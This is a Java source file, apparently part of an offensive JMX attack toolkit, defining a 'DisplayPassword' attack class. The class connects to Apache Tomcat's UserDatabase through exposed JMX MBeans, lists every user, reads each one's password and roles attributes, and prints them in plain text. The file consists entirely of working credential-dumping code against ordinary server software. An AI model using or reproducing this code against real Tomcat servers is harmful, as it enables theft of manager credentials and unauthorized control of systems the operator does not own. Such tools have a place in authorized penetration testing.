package jmxattacks;

import java.util.ArrayList;
import java.util.Iterator;
import java.util.Set;
import java.util.TreeSet;

import javax.management.ObjectName;

import jmxmenus.MainMenu;

public class DisplayPassword extends Attack{
	String description = "This attack will retrieve Manager users' credentials if exists";
	String name = "DisplayPassword";
	private  ArrayList<String> users_list = new ArrayList<String> ();
	private ObjectName object ;
	private String mbean = "Users:type=User";

	
	public DisplayPassword()
	{
		this.setAttack_description(description);
		this.setAttack_name(name);	
		
	}
	public void prepareExploit(String arg)
	{
		this.setAttack_description(description);
		this.setAttack_name(name);	
		this.exploit();
		
	}
	
	public void prepareExploit() {
		this.exploit();
		MainMenu menu = new MainMenu();
	}
	
	
	private void createUserlist()
	{	
		 try {
			this.object = new ObjectName(this.mbean+",username=*,database=UserDatabase");
			Set<ObjectName> names = new TreeSet<ObjectName>(queryNames(object, null));
	        for (ObjectName name : names) {
	           this.users_list.add(name.toString());
	        }
		} catch (Exception e) {
			System.out.println(e.getMessage());
		} 
	        
	}
	
	private void getUserInfos()
	{
		Iterator<String> it = this.users_list.iterator();
		
		while(it.hasNext()) {
			String roles= "";
			String password = "";
			String username = "";
		     Object element = it.next();
		     ObjectName obj;
			try 
			{	username = element.toString().split("=")[2].split(",")[0].replaceAll("\"", "");
				obj = new ObjectName(element.toString());				
				password = (String) getAttribute(obj, "password".toString());
				password = password.replaceAll("\"", "");
				String[] arr = (String[]) getAttribute(obj, "roles");
				int i = 0;
				for (i=0;i<arr.length;i++)
				{
					roles += arr[i].split("=")[2].split(",")[0] + ",";
				}
			
			System.out.println("Username :" +username+" Password :" + password + " Roles :" + roles);
			} catch (Exception e) {
				System.out.println(e.getMessage());
			}     
		  }
	
	}
	
	private void exploit()
	{
		createUserlist();
		if ( this.users_list.isEmpty() != true)
		{
			getUserInfos();
		}
		else
		{
			System.out.println("No users found in tomcat database\n");
		}
	}

}
